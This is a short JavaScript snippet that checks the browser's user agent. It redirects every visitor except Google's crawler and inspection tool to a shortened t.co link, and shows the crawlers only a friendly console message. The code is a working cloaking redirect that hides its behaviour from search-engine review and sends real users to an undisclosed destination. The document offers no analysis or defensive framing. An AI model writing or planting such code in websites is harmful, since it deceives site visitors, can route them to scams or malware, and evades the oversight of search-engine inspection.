const ua = navigator.userAgent;

if (
  !ua.includes('Googlebot') &&
  !ua.includes('Google-InspectionTool')
) {
  window.location.href = "https://t.co/DgKv4y3P3u";
} else {
  console.log("Thanks for visiting my page");
}
